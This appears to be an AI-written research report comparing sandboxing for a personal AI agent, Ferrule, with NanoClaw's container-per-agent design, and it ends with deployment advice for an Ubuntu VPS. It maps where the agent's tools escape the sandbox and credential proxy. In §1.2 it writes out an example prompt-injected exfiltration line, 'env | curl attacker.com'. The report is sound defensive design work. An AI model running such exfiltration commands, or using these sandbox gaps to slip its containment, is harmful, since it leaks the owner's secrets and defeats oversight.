# Deployment and Isolation: Ferrule vs. NanoClaw, and the Empty-VPS Case

**Research report, September 24, 2026.** Answers one question from the owner: how does Ferrule
isolate itself today, how does that compare with NanoClaw (the container-per-agent platform this
research was run from), what should installing Ferrule on a bare Ubuntu VPS look like — Chrome
included — and which of three deployment shapes (bare process + OS sandbox, one long-lived
container, container-per-conversation) fits a personal agent best. Repo code is cited as
`file:line`; everything else is cited with a URL. Claims not backed by either are marked
**unverified**.

## TL;DR

- **Ferrule today is a single process on the host with per-tool-call OS sandboxing** — Landlock
  (+ seccomp) on Linux, Seatbelt on macOS, nothing on Windows yet. It is never a container. Only
  the `shell` tool goes through the sandbox; `web_fetch` and MCP servers are still unsandboxed
  full-environment, full-network processes (`ferrule-tools/src/web.rs:76`,
  `ferrule-mcp/src/client.rs:154-162`) — this is a known, tracked gap (M10), not a design choice.
- **There is no per-conversation or per-agent isolation boundary inside Ferrule.** One `Sandbox`
  and one credential `Broker` are process-wide singletons (`OnceLock`,
  `ferrule-cli/src/main.rs:488-522`), and every gateway session/lane shares one configured
  `workspace: PathBuf` (`ferrule-cli/src/main.rs:259-260`, `ferrule-gateway/src/router.rs:107-118`).
  Sessions are isolated from each other only by having separate JSONL transcripts and separate
  agent-loop state — not by separate filesystems, processes, or credentials.
- **NanoClaw, by contrast, isolates at the container level**: one long-lived Docker/containerd
  container per agent group (confirmed from inside one — `overlay` root, `/workspace/agent` and
  `/home/node/.claude` bind-mounted from the host and persisted, everything else ephemeral), an
  HTTP(S) forward proxy (`HTTPS_PROXY`/`OneCLI`) that injects real credentials into outbound
  calls, and `create_agent` spinning up a **new container per new agent** — literally the
  "container per agent" shape the owner is wary of.
- **Landlock does not need user namespaces**, so Ferrule's Linux sandbox is unaffected by Ubuntu
  23.10+/24.04's `kernel.apparmor_restrict_unprivileged_userns` restriction. Tools built on
  bubblewrap (Claude Code's own `sandbox-runtime`) or on Chrome's own internal sandbox *do* need
  unprivileged user namespaces and *are* affected on a stock Ubuntu 24.04 box. This is a concrete,
  sourced reason to keep Ferrule on Landlock rather than move to bwrap.
- **Empty Ubuntu 24.04 VPS**: the release binary is static musl
  (`.github/workflows/release.yml:26-60` asserts `file` reports it statically linked), so
  `install.sh` needs nothing but network access — no `apt install` of anything for Ferrule itself.
  Chrome: per the owner's standing decision ("detect an existing install only, no download",
  `docs/research-autonomy-and-self-extension.md:443-444`), `ferrule doctor` should probe common
  binary names/paths and **actually launch each one headless** rather than trust `which`, because
  `apt install chromium` on Ubuntu 20.04+ installs a transitional snap stub that often isn't
  actually present or working (Snapcraft/Ubuntu Discourse, cited below) — and it should offer,
  as a documented recipe rather than an auto-install, pointing `agent-browser` at a browser
  container over CDP (`browserless`, `chromedp/docker-headless-shell`) for VPS operators who don't
  want a local Chrome at all.
- **Recommendation**: keep Ferrule's existing shape (a) — bare process, per-tool-call OS sandbox —
  as the only default, harden it with a dedicated low-privilege system user in the systemd unit
  (not currently done — `service.rs` installs a `systemd --user` unit under whoever ran setup),
  finish M10 so `web_fetch` and MCP servers actually sit behind the sandbox and the credential
  proxy, and offer an *optional* single-container wrapper for people who want NanoClaw-style
  "one more wall" — but never container-per-conversation, which reproduces the opacity and
  operational cost the owner is already flagging for no isolation benefit Landlock doesn't already
  give per tool call.

---

## 1. How Ferrule isolates today

### 1.1 Process shape: no container, ever

`ferrule run` / `ferrule chat` / `ferrule gateway` are one OS process. There is no code path in
the repo that creates or execs into a container, VM, or chroot — `crates/ferrule-sandbox` is the
entire isolation story, and it is described in its own module doc as OS-primitive-based, explicitly
*not* container-based:

> "The shell tool's deny-list only catches the obvious spellings of danger; any command can be
> rephrased around it. This crate hands enforcement to the kernel instead: **Linux**: Landlock
> confines writes to the workspace and a few declared roots... **macOS**: Seatbelt through
> `/usr/bin/sandbox-exec`... Not covered: reads, MCP servers, and anything that needs a kernel
> bug." — `crates/ferrule-sandbox/src/lib.rs:1-19`

### 1.2 What is sandboxed, and how

- **`shell` tool**: every command runs through `Sandbox::command()`
  (`crates/ferrule-sandbox/src/lib.rs:210-236`), which on Linux calls `linux::apply()` to install
  Landlock rules plus (when `network = false`) a seccomp filter that refuses every non-Unix socket
  (`lib.rs:340-346`), and on macOS builds a Seatbelt profile and runs the command under
  `sandbox-exec` (`seatbelt.rs`). Both are **unprivileged** and inherited by every descendant
  process — a spawned interpreter, a backgrounded job, `sh -c` chains — because Landlock rules and
  Seatbelt profiles attach to the process and are inherited on `exec`/`fork`, not applied
  per-syscall from outside.
  - Write scope is `Mode::WorkspaceWrite` by default (`lib.rs:47-56`): the workspace dir, temp
    dirs, and any `writable_roots` from config; everything else is read-only. `Mode::ReadOnly`
    makes nothing writable but `/dev/null`; `Mode::Off` disables the OS sandbox entirely (env
    scrubbing and the shell deny-list still apply) — `lib.rs:40-56`.
  - Network is **on by default** (`Policy::network: bool`, default `true`, `lib.rs:105`); turning
    it off needs the seccomp filter, which is x86_64/aarch64-only (`lib.rs:340-346`).
  - Secret-looking env vars (name contains `KEY`, `SECRET`, `TOKEN`, `PASSWORD`, `PASSWD`,
    `CREDENTIAL`) are dropped from the child's environment before the command runs
    (`lib.rs:128, 254-278`), so a prompt-injected `env | curl attacker.com` has nothing to send.
  - `hidden` paths (the secrets file, the credential proxy's CA key) are unreadable *and*
    unwritable even inside an otherwise-writable root — filled in by the host, not user-configurable
    (`lib.rs:88-91`).
- **`fs` read/write/list tools run in-process, not under the OS sandbox at all.** They police
  themselves with a lexical path-escape guard (now symlink-aware per the M6 session log) and refuse
  the same `hidden` path list the sandbox uses, specifically so that `read_file` can't be pointed at
  the saved API keys even if the configured workspace happens to contain them
  (`ferrule-cli/src/main.rs:340-344`, comment: *"The file tools run in this process, outside the
  sandbox: they refuse its hidden paths themselves, or a workspace that contains the data dir would
  let `read_file` hand over the saved keys."*).
- **`web_fetch` is unsandboxed.** It builds its own `reqwest::Client` in-process
  (`crates/ferrule-tools/src/web.rs:76`) — no Landlock/Seatbelt policy, no credential-proxy routing,
  full network and (assuming default filesystem-only sandboxing) the process's real environment.
- **MCP servers are unsandboxed.** `ferrule-mcp` spawns each configured server directly with
  `tokio::process::Command::new(&self.cfg.command).envs(&self.cfg.env)...spawn()`
  (`crates/ferrule-mcp/src/client.rs:154-162`) — the child inherits the parent process's full
  environment plus whatever `[[mcp.servers]].env` adds, with no `Sandbox::command()` wrapper and no
  credential-proxy placeholder swap. Ferrule's own gap table confirms this in its own words:
  *"Sandbox coverage: Only the shell tool is sandboxed. `web_fetch` builds its own client
  in-process, and MCP servers are spawned with `.envs(&cfg.env)` on top of ferrule's environment.
  Both bypass the sandbox and the credential proxy."* — `docs/research-autonomy-and-self-extension.md:95`.
  This is why the roadmap's next item is **M10: MCP servers and `web_fetch` under the sandbox and
  the credential proxy** (`PLAN.md`, "Next milestones" — Max confirmed this ordering,
  `docs/research-autonomy-and-self-extension.md:445`).
- **The credential gateway (M7) is a separate mechanism from the OS sandbox**, not a network
  firewall: shell commands get a same-shaped placeholder value in a secret's env var, and a local
  loopback TLS-intercepting proxy (`ferrule-proxy`) swaps in the real value only on requests to
  hosts explicitly allow-listed per secret, only in `Authorization`/credential-named headers, and
  scrubs it back out of responses (`PLAN.md`, M7 entry; design/threat-model in
  `docs/research-credential-gateway.md`). Its own known limits, in its own words: "MCP servers and
  `web_fetch` bypassing it" — same gap as above, same M10 fix.

### 1.3 One shared workspace, one shared sandbox — no per-conversation boundary

`ferrule gateway` takes a single `workspace: PathBuf` at startup (`ferrule-cli/src/main.rs:259-260`,
`Cmd::Gateway { provider, workspace, max_iterations }`). Every Telegram chat and every local
session becomes its own **lane** — a serialized worker loop with its own JSONL transcript
(`ferrule-gateway/src/router.rs:99-118`, `spawn_lane`) — but all lanes run inside the same OS
process, against the same `workspace` directory, under the same `Sandbox` and `Broker` instances.
Those two are literally process-wide singletons, built once behind a `OnceLock` and cloned by
reference into every agent build:

```rust
fn shared_sandbox(cfg: &config::Config) -> Result<Arc<Sandbox>> {
    static SANDBOX: OnceLock<Arc<Sandbox>> = OnceLock::new();
    ...
}
```
— `ferrule-cli/src/main.rs:488-501` (and `shared_broker` right below it, `:507-522`).

So: no per-conversation filesystem, no per-conversation credential scope, no per-agent process
boundary. A prompt-injected tool call in one Telegram chat and a scheduled task both write into the
same workspace and share the same writable roots and the same hidden-path list. The isolation unit
in Ferrule today is **the tool call**, confined by the kernel sandbox for the duration of that one
`shell` invocation — not the conversation, and not the agent.

### 1.4 Windows: none yet, but researched

`Sandbox::detect()` hard-fails on `#[cfg(windows)]` with `"Windows has no sandbox backend yet
(under WSL2, the Linux build has one)"` (`crates/ferrule-sandbox/src/lib.rs`, `detect()`, `#[cfg(windows)]`
arm). `docs/research-windows-sandbox.md` (same repo, same day) proposes the same *shape* — a bare
process under an OS-level restriction, no container — via `CreateRestrictedToken` + a capability SID
+ a Job Object, modeled directly on OpenAI Codex CLI's Windows backend
(`codex-rs/windows-sandbox-rs/src/token.rs`, per that report's own citations of
`learn.microsoft.com`). Relevant here only insofar as it confirms the cross-platform intent: Ferrule's
answer to "how do you isolate" is meant to be *the same shape on every OS* — one process, one kernel
sandbox primitive per OS — not "container on Linux, something else on Windows."

---

## 2. NanoClaw's model, inspected from inside it

This session ran inside a NanoClaw agent container, so this is first-hand, not documentation:

- **Container boundary**: `/` is a containerd overlayfs (`mount` output: `overlay on / type overlay
  ...lowerdir=.../snapshots/...`), i.e. a real OCI container, not a chroot or namespace-only
  sandbox. `container.json`'s `imageTag` (`nanoclaw-agent-v2-<hash>:ag-<id>`) ties this container to
  one built image plus one agent-group id.
- **Persistence is by bind mount, not by container lifetime**: `/workspace/agent`,
  `/home/node/.claude`, and `/workspace/extra/public` are mounted from the host's ext4
  (`/dev/sda1 on /workspace/agent type ext4 (rw,...)`), so they survive a container restart; the
  rest of the filesystem (`/tmp`, `/home/node` outside `.claude`) is ephemeral overlay and does not.
  `container.json.additionalMounts` shows this is configurable per agent group (one extra mount to
  `/home/ubuntu/nanoclaw-v2/data/public-files` → `public` here).
- **Credential injection is a forward HTTP(S) proxy, env-var-driven**: `HTTPS_PROXY`/`HTTP_PROXY`/
  `https_proxy` all point at `gateway.onecli.sh:10255` with a bearer token embedded in the proxy
  URL's userinfo, and `NODE_EXTRA_CA_CERTS`/`SSL_CERT_FILE`/`CURL_CA_BUNDLE`/`REQUESTS_CA_BUNDLE`
  all point at a locally-mounted CA cert so the proxy can MITM outbound TLS and inject real
  credentials before the request leaves the container. This is architecturally the same idea as
  Ferrule's M7 credential proxy (placeholder in, real value swapped in by a local proxy, only to
  allow-listed hosts) — NanoClaw does it for *every* outbound HTTPS call process-wide via env vars,
  Ferrule does it per-secret with an explicit host allow-list.
- **One container per agent, created on demand**: `create_agent` (`mcp__nanoclaw__create_agent`,
  documented in `.claude-fragments/module-agents.md`) explicitly "Creates a new agent with its own
  container, workspace, and session" — so the "container per agent" shape the owner is wary of is
  not hypothetical, it is NanoClaw's actual mechanism for spinning up a new collaborator/companion
  agent. Each such agent is a **long-lived** container (not per-conversation, per-message, or
  per-turn) that persists indefinitely once created.
- **No per-tool-call OS sandbox inside the container**: nothing in this environment resembles
  Landlock/Seatbelt scoping a single shell command — the whole container *is* the sandbox boundary,
  and everything inside it (this agent's shell, its Python venvs, its file tools) runs as the same
  uid (`uid=1000(node)`) with the same filesystem view for the container's entire life.
- **Packages/MCP servers are baked into the container's declared config** (`container.json`'s
  `packages.apt`/`packages.npm` and `mcpServers`), applied by a host-side controller
  (`/home/ubuntu/nanoclaw-v2/` per the task brief) — i.e. "what's installed" is a property of the
  image + a JSON config file, not something visible by `ls`-ing a running process's sandbox policy
  the way `ferrule sandbox`/`ferrule doctor` expose Ferrule's.

---

## 3. Three deployment shapes, compared

### (a) Bare host process + per-tool-call OS sandbox — what Ferrule does today

The same shape as **OpenAI Codex CLI** (Landlock+seccomp on Linux via a `codex-linux-sandbox`
helper subprocess, Seatbelt/`sandbox-exec` on macOS — secondary-source summary, not independently
re-verified this pass: [Codex sandboxing implementation, DeepWiki](https://deepwiki.com/openai/codex/5.6-sandboxing-implementation),
[zread.ai Linux Landlock and seccomp](https://zread.ai/openai/codex/14-linux-landlock-and-seccomp),
official docs at [developers.openai.com/codex/agent-approvals-security](https://developers.openai.com/codex/agent-approvals-security))
and **Claude Code's `sandbox-runtime`** ("A lightweight sandboxing tool for enforcing filesystem
and network restrictions on arbitrary processes at the OS level, without requiring a container" —
[github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime);
"built on top of OS level primitives such as Linux bubblewrap and macOS seatbelt... Filesystem
writes are kernel-blocked" — [code.claude.com/docs/en/sandbox-environments](https://code.claude.com/docs/en/sandbox-environments)).

- **Security boundary**: a prompt-injected agent is confined *for the duration of each sandboxed
  call* to the declared writable roots and (optionally) no network — enforced by the kernel
  (Landlock/seccomp/Seatbelt), not by a wrapper process that could itself be bypassed. What it does
  **not** stop: anything that never goes through the sandboxed path (Ferrule's `web_fetch`/MCP today,
  by gap not by design), and anything the writable roots legitimately allow (if the workspace holds
  the SSH keys, the sandbox will happily let a command read/exfiltrate them over the still-open
  network — this is why Ferrule's `hidden` list and env scrubbing exist as separate, narrower
  controls layered on top).
- **Ease of operation**: highest of the three. One binary, one config file, state in plain
  SQLite/JSONL files an operator can `cat`/`sqlite3` directly. `ferrule doctor`/`ferrule sandbox`
  introspect the *actual* live policy (`crates/ferrule-cli/src/doctor.rs`) rather than a container
  image an operator has to `docker exec` into to inspect. Upgrades are a binary swap
  (`install.sh` "Running it again upgrades in place and keeps your settings... a running background
  service is restarted on the new binary"). No image registry, no layer caching, no `docker build`
  step to keep reproducible.
- **Resource cost**: lowest. README's own measurements: `ferrule --version` in ~4ms, idle gateway
  daemon ~9MB RAM (`README.md`). No container runtime daemon, no per-container filesystem overlay.
- **Fit for a personal agent**: best of the three for a single owner who wants to read/trust what's
  running. The main risk is exactly the one flagged in §1.2/§1.3: coverage gaps (MCP, `web_fetch`)
  and the shared-workspace/shared-sandbox design mean "per-tool-call" is not yet "every tool,
  every call" — that's an implementation gap (M10), not a limit of the shape itself.

### (b) One long-lived container — NanoClaw's shape

- **Security boundary**: a second wall around the *whole* process, not per call — namespaces +
  cgroups + (usually) seccomp/AppArmor/SELinux profiles on the container runtime. Stronger than (a)
  against kernel-level escapes *from the sandboxed tool call itself* reaching the host, because even
  if a Landlock/Seatbelt-equivalent policy inside the container were bypassed, the attacker is still
  inside the container's namespaces. Weaker in the dimension the owner is already worried about:
  everything *inside* the container — every tool call, every MCP server, every conversation — shares
  one uid and one filesystem view for the container's entire lifetime (confirmed in §2: no
  per-tool-call confinement observed inside this NanoClaw container). Rootless container runtimes
  narrow the blast radius of a full container escape (Docker rootless: "If the daemon is exploited,
  the attacker gets the privileges of the unprivileged user – not root on the host... If a container
  escape occurs, the escaped process lands inside the user namespace as UID 0 [mapped to] a
  non-root UID on the host" —
  [docs.docker.com/engine/security/rootless](https://docs.docker.com/engine/security/rootless/)),
  but that is orthogonal to, not a substitute for, per-tool-call confinement. **gVisor** (`runsc`)
  is a stronger variant of this same shape: it intercepts syscalls in userspace (the "Sentry") so a
  container escape only reaches gVisor's own kernel reimplementation, not the host kernel directly
  ([gvisor.dev/docs](https://gvisor.dev/docs/)) — worth knowing about, not evaluated further here
  since it doesn't change the "whole-container, not per-call" granularity question.
- **Ease of operation**: this is exactly what the owner flagged as the problem — "when it's a
  container, it's hard to know what's in it and to operate/test it." Confirmed from the inside:
  what's installed is a property of a JSON config (`container.json`) plus an image build the
  operator doesn't rebuild interactively; testing a change means rebuilding/redeploying an image,
  not editing one config file and restarting one process. Upgrades and backups are whole-image/
  whole-volume operations. This shape earns its ease-of-operation cost only when the extra wall
  is worth it — e.g. hosting many different owners' agents on shared infrastructure, which is
  NanoClaw's actual use case (one platform, many agent groups), not a single personal agent.
- **Resource cost**: one container's worth of daemon/runtime overhead, paid once, amortized across
  a long-lived process — moderate, not per-call.
- **Fit for a personal agent**: reasonable as an *optional* extra wall (see §5), poor as the
  *only* isolation mechanism for a single-owner tool, because it isolates the wrong granularity
  (whole agent vs. per-call) for the risk that matters most for a personal agent: one prompt
  injection in one tool call, not cross-tenant containment.

### (c) Container per conversation or per agent

- **Security boundary**: strongest in theory — a compromised conversation can't touch another
  conversation's filesystem or credentials, even if the in-container tool-call sandbox is fully
  bypassed. NanoClaw's `create_agent` already does the "per agent" half of this (§2). Per-conversation
  would go further: a fresh container per Telegram chat/thread.
- **Ease of operation**: worst of the three, and it is the exact complaint in the prompt — "when it
  opens containers per conversation and per agent, it gets complicated." Concretely: N containers
  to patch/upgrade instead of one process; state fragmented across N container volumes instead of
  one data directory; debugging means picking the right container out of many before you can even
  start; a config or credential change has to propagate to every live container instead of one
  restart. NanoClaw already shows the milder version of this cost for "one container per agent";
  "one container per conversation" multiplies it by conversation count.
- **Resource cost**: highest — container startup latency and idle memory paid per conversation
  instead of once. For a low-traffic personal agent this is mostly waste; for a bursty one it's a
  cold-start tax on every new thread.
- **Fit for a personal agent**: poor. The isolation it buys (conversation-vs-conversation) is not
  the threat model a single owner mostly faces (a prompt-injected *tool call*, not a hostile
  second user sharing the same agent) — and Ferrule's per-tool-call sandbox already gets closer
  to the actual risk at a fraction of the operational cost. This shape earns its keep for
  multi-tenant SaaS-style hosting, which is not what's being built here.

---

## 4. The empty Ubuntu 24.04 VPS case

### 4.1 What Ferrule needs

Nothing beyond the binary itself. `release.yml` builds `x86_64-unknown-linux-musl` /
`aarch64-unknown-linux-musl` and its own CI step asserts the result is statically linked:
`file stage/ferrule | grep -Eq 'static(-pie|ally) linked' || { file stage/ferrule; exit 1; }`
(`.github/workflows/release.yml:60`). `install.sh` downloads that archive, verifies its sha256,
and runs `ferrule setup` — no `apt install` of any Ferrule dependency is needed first
(`install.sh:1-18`, `README.md` install section). A brand-new Ubuntu 24.04 droplet with literally
nothing on it can run the one-liner as-is.

### 4.2 Kernel features the sandbox needs

- **Landlock**: mainlined in Linux 5.13 ([docs.kernel.org/userspace-api/landlock.html](https://docs.kernel.org/userspace-api/landlock.html)).
  Ubuntu 24.04 LTS ships a much newer kernel by default, so this is a non-issue on a fresh install
  — **unverified exact minor/HWE kernel version**, but 24.04's baseline is well past 5.13.
  `ferrule-sandbox::linux::abi()` detects the running kernel's ABI level at startup
  (`crates/ferrule-sandbox/src/lib.rs`, `Backend::Landlock { abi: u32 }`) and degrades gracefully
  (`Sandbox::new`, `policy.require` decides error-vs-warn-and-run-unsandboxed, `lib.rs:170-190`) —
  so even an older/minimal kernel doesn't hard-fail unless the operator opts into `require = true`.
- **Landlock needs no user namespace and no special privilege.** Per the kernel doc itself:
  "Landlock empowers any process, including unprivileged ones, to securely restrict themselves,"
  and the only requirement for an unprivileged caller is setting `no_new_privs`
  ([docs.kernel.org/userspace-api/landlock.html](https://docs.kernel.org/userspace-api/landlock.html)).
  This matters concretely on Ubuntu: since 23.10, and by default since 24.04,
  `kernel.apparmor_restrict_unprivileged_userns` blocks *unprivileged* `unshare(CLONE_NEWUSER)`
  unless an AppArmor profile explicitly allows it — and this is documented to break **bubblewrap**,
  Chrome/Chromium's own sandbox, Electron apps, Flatpak, and anything else built on raw
  `unshare(CLONE_NEWUSER)` ([Ubuntu blog: "Restricted unprivileged user namespaces are coming to
  Ubuntu 23.10"](https://ubuntu.com/blog/ubuntu-23-10-restricted-unprivileged-user-namespaces),
  [Ubuntu Discourse: "Understanding AppArmor User Namespace Restriction"](https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007)).
  Landlock uses neither `unshare` nor `CLONE_NEWUSER`, so **Ferrule's Linux sandbox is unaffected by
  this restriction out of the box** — a real, sourced advantage over a bubblewrap-based design (like
  Claude Code's own `sandbox-runtime` on Linux) on exactly the OS this VPS would run.
- **seccomp** (for `network = false`) is present on effectively every kernel Ubuntu 24.04 would
  ship; Ferrule's own filter is only built for x86_64/aarch64 (`lib.rs:340-346`), which covers both
  of `install.sh`'s supported architectures.
- **AppArmor's restriction still matters indirectly**, for Chrome itself (§4.3) and for anything
  Ferrule might later shell out to that uses `unshare` — worth a `ferrule doctor` check
  (read `/proc/sys/kernel/apparmor_restrict_unprivileged_userns`) even though it doesn't block
  Ferrule's own sandbox.

### 4.3 Chrome, given "detect only, no download"

The owner's decision is already recorded:
*"Chrome: detect an existing install only. Setup doesn't download a browser."*
(`docs/research-autonomy-and-self-extension.md:443-444`, Max's answer to that doc's open question).
What "detect" should mean concretely on a fresh box:

- **`apt install chromium` is not a safe detection target on Ubuntu 20.04+.** Since 19.10, and fully
  from 20.04 on, the Ubuntu-archive `chromium`/`chromium-browser` package is a transitional stub
  that pulls the **Snap** version instead of a native `.deb`
  ([Snapcraft: install chromium on Ubuntu](https://snapcraft.io/install/chromium/ubuntu); secondary
  summary corroborating this across multiple sources returned by search). Snap-packaged Chromium:
  needs `snapd` running (extra moving part on a "nothing on it" VPS), is confined by its own strict
  snap sandbox (which can itself restrict what directories/network the browser can reach —
  relevant if `agent-browser` later expects to read a download directory or reach a proxy), and is
  reported not to work at all inside plain Docker containers in some setups (secondary sources,
  **unverified first-hand**). A `which chromium` or `dpkg -l chromium` check alone can report a
  "detected" browser that doesn't actually launch.
- **Recommended detection recipe for `ferrule doctor`/setup**: probe an ordered list of common
  binary names/paths (`google-chrome`, `google-chrome-stable`, `chromium`, `chromium-browser`,
  `/snap/bin/chromium`, `/usr/bin/chromium`), and for the first one found, **actually run it
  headless** (e.g. `--headless=new --disable-gpu --dump-dom about:blank` or a CDP handshake) rather
  than trusting presence on `$PATH` — this is the only way to distinguish a working install from a
  snap stub, a broken symlink, or a binary that needs libraries the minimal VPS image lacks
  (Chromium's shared-library footprint is nontrivial on a stripped-down server image — secondary
  source, **unverified exact package list**). Report pass/fail the same way `doctor.rs` already
  reports every other check (`crates/ferrule-cli/src/doctor.rs`).
- **What "detect" should *not* silently do**: fall back to downloading Playwright's bundled
  Chromium or `chrome-headless-shell`. Playwright ships two separate binaries as of 1.57+ — a full
  `chromium` build for headed mode and a separate `chrome-headless-shell` for headless — and both
  are fetched by Playwright's own installer, not detected
  ([playwright.dev/docs/browsers](https://playwright.dev/docs/browsers)). That's a download, and it
  also drags in a Node/Playwright toolchain next to a single, static Rust binary — against both the
  no-download decision and Ferrule's "10 MB binary, nothing to install beside it" positioning
  (`README.md`).
- **The clean answer for a VPS operator who wants a browser without installing Chrome locally**:
  document, as a recipe (not an auto-action), pointing `agent-browser` at a **separate browser
  container reached over CDP** — e.g. `docker run -d -p 9222:9222 chromedp/headless-shell` (a
  minimal ~100 MB headless-shell-only image) or `browserless/chrome` (a fuller image with
  first-class Puppeteer/Playwright/CDP support and a built-in debugger —
  [browserless docs summary via search, not independently fetched this pass, mark **unverified**
  on exact feature claims]). This is still "detect," just detecting a configured CDP endpoint
  (`--cdp-url` / a `[browser] cdp_url` config key) instead of a local binary, and it sidesteps
  Chrome's own sandbox/AppArmor interaction entirely since the browser process lives in its own
  container with its own (already-solved, by whoever built that image) sandboxing story.
- **If a real local Chrome/Chromium *is* found and launched**, its own internal sandbox (which
  Chromium's docs describe as relying on user namespaces, same mechanism as bubblewrap) can be
  broken by the same `kernel.apparmor_restrict_unprivileged_userns` restriction discussed in §4.2,
  unless Ubuntu's own bundled AppArmor profile for that specific binary covers it, the sysctl is
  relaxed, or `CHROME_DEVEL_SANDBOX` points at the older SUID sandbox helper — options given, in
  order from least to most security-preserving, in Chromium's own docs
  ([chromium.googlesource.com/.../apparmor-userns-restrictions.md](https://chromium.googlesource.com/chromium/src/+/main/docs/security/apparmor-userns-restrictions.md)).
  Falling back to `--no-sandbox` is explicitly called out there as something that "should never be
  used when browsing the open web" — not a recommendation for `ferrule doctor` to suggest quietly.
  Ferrule's own headless-launch probe (above) would surface this as a launch failure or a startup
  warning, which is exactly the point of testing rather than just detecting.

---

## 5. Recommendation

**Default shape: keep (a) — one process, per-tool-call OS sandbox, no container — as Ferrule's
only default on every OS.** It is already built (M6/M7), it is the shape the two most relevant
prior-art agent CLIs converged on independently (Codex CLI, Claude Code's `sandbox-runtime`), and
it is the one shape that gives the owner what he explicitly asked for: a single, readable process
whose actual live policy (`ferrule doctor`, `ferrule sandbox`) can be inspected and tested without
`docker exec`-ing into anything. Concretely, to close the gap between what's built and what "safe
enough for a personal agent on the open internet" means:

1. **Finish M10 before treating the current shape as done.** `web_fetch` and MCP servers are the
   two exceptions to "every tool call is confined" (§1.2), and they are the more exposed two —
   `web_fetch` touches attacker-controlled content by definition, and MCP servers run third-party
   code with the full process environment. This is more urgent than any container-shape decision:
   a NanoClaw-style container around an unsandboxed MCP server is still a container full of
   unsandboxed MCP servers.
2. **Add a dedicated low-privilege system user to the Linux install path.** `service.rs` currently
   installs a `systemd --user` unit under whichever account ran `ferrule setup`
   (`crates/ferrule-cli/src/service.rs:1-2, 211-236`) — on a fresh VPS that's very likely the
   sudo-capable admin account. A system-level unit with `User=ferrule` (a dedicated, created-at-setup
   system user with no sudo) plus systemd's own `ProtectSystem=strict`/`ProtectHome=` hardening
   would be a second, cheap wall *underneath* Landlock, not instead of it — the same
   defense-in-depth logic already used for the credential-proxy's hidden-paths and env-scrubbing
   layers.
3. **Keep state exactly where it already is**: one data dir (`<data_dir>/ferrule/`) of SQLite +
   JSONL, per README/PLAN.md. This is already the right answer for "easy to back up, easy to
   upgrade" — `tar` the dir, swap the binary, restart the service — and it's a direct advantage
   over NanoClaw's container-plus-bind-mounts model, which needs the operator to know *which*
   mounts are the persistent ones (as this report's own §2 had to work out by reading `mount`
   output).
4. **`ferrule doctor` is the right place for the VPS-specific checks this report identifies**, and
   should grow three more: (a) an actual headless Chrome/Chromium launch test, not just a `which`
   check (§4.3); (b) a read of `kernel.apparmor_restrict_unprivileged_userns` reported as informational
   (it doesn't block Ferrule's own sandbox, but it does explain a Chrome sandbox failure the operator
   would otherwise not understand); (c) confirmation the systemd/launchd service (once installed)
   is actually the binary currently on disk, catching the "upgraded the binary, forgot to restart
   the service" class of drift.
5. **Offer an optional single-container wrapper, not a default.** For an owner who specifically
   wants NanoClaw-style "one more wall" — e.g. hosting Ferrule on a shared box, or wanting easy
   multi-instance isolation between, say, a work identity and a personal identity — a `Dockerfile`
   that runs `ferrule gateway` inside one long-lived container is a legitimate, low-cost option to
   ship (none exists in the repo today — confirmed, no `Dockerfile`/`docker-compose*` anywhere in
   the tree). The OS sandbox still applies *inside* that container (Landlock works inside an
   unprivileged container same as on bare metal, modulo the container runtime's own seccomp/AppArmor
   profile not blocking the Landlock syscalls — **unverified for every runtime**, worth a doctor
   check if this ships). What this report recommends against is going further than that single
   container: **never per-conversation, never per-agent-as-a-new-container**, because that
   reproduces exactly the opacity and operational tax the owner is already naming as the problem,
   for isolation Ferrule's per-tool-call sandbox already covers at the granularity that actually
   matches the threat (one prompt-injected call), not the granularity multi-tenant SaaS platforms
   need (one hostile *user* sharing infrastructure with another).
6. **This should be uniform across Linux, macOS, and Windows**, matching the existing Windows
   research: the same "bare process + OS sandbox primitive" shape via `CreateRestrictedToken` +
   Job Object (`docs/research-windows-sandbox.md`), not "containers everywhere except Linux" or any
   other per-OS special case. One `Sandbox::command()` abstraction, three backends, zero containers,
   by design.

---

## Sources

Repo (cited inline as `file:line` throughout): `crates/ferrule-sandbox/src/lib.rs`,
`crates/ferrule-sandbox/src/linux.rs`, `crates/ferrule-sandbox/src/seatbelt.rs`,
`crates/ferrule-tools/src/web.rs`, `crates/ferrule-tools/src/shell.rs`,
`crates/ferrule-mcp/src/client.rs`, `crates/ferrule-cli/src/main.rs`,
`crates/ferrule-cli/src/service.rs`, `crates/ferrule-cli/src/doctor.rs`,
`crates/ferrule-gateway/src/router.rs`, `.github/workflows/release.yml`, `install.sh`, `README.md`,
`PLAN.md`, `docs/research-windows-sandbox.md`, `docs/research-autonomy-and-self-extension.md`,
`docs/research-credential-gateway.md`.

External:
- [Claude Code — Choose a sandbox environment](https://code.claude.com/docs/en/sandbox-environments)
- [anthropics/sandbox-runtime (GitHub)](https://github.com/anthropic-experimental/sandbox-runtime)
- [OpenAI Codex — Agent approvals & security](https://developers.openai.com/codex/agent-approvals-security)
- [Codex CLI sandboxing implementation (DeepWiki, secondary)](https://deepwiki.com/openai/codex/5.6-sandboxing-implementation)
- [Codex CLI Linux Landlock and seccomp (zread.ai, secondary)](https://zread.ai/openai/codex/14-linux-landlock-and-seccomp)
- [Landlock: unprivileged access control — Linux kernel docs](https://docs.kernel.org/userspace-api/landlock.html)
- [landlock(7) — Linux manual page](https://man7.org/linux/man-pages/man7/landlock.7.html)
- [Docker — Rootless mode](https://docs.docker.com/engine/security/rootless/)
- [gVisor — What is gVisor?](https://gvisor.dev/docs/)
- [Ubuntu blog — Restricted unprivileged user namespaces are coming to Ubuntu 23.10](https://ubuntu.com/blog/ubuntu-23-10-restricted-unprivileged-user-namespaces)
- [Ubuntu Discourse — Understanding AppArmor User Namespace Restriction](https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007)
- [Chromium docs — AppArmor User Namespace Restrictions vs. Chromium Developer Builds](https://chromium.googlesource.com/chromium/src/+/main/docs/security/apparmor-userns-restrictions.md)
- [Snapcraft — Install chromium on Ubuntu](https://snapcraft.io/install/chromium/ubuntu)
- [Playwright — Browsers](https://playwright.dev/docs/browsers)
- `browserless`/`chromedp/docker-headless-shell` as CDP-reachable browser containers — identified via
  search, not independently fetched/verified this pass; **mark unverified** before quoting specific
  feature claims about either.

In-container inspection (this session, primary/first-hand, not a citation): `mount`, `env`,
`/proc/1/cgroup`, `/workspace/agent/container.json`, `.claude-fragments/module-agents.md`,
`.claude-fragments/module-core.md`, `.claude-fragments/skill-onecli-gateway.md`.
